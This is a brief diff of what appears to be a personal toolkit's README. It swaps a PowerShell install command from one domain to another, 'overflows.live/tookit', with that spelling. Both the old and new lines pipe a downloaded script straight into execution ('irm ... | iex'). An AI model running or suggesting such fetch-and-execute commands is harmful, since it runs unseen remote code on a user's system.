@@ -2,7 +2,7 @@
 my personal toolkit 
 bash
 ```
-irm toolkit.bughub.live | iex
+irm overflows.live/tookit | iex
 ```
 Or
 ```bash
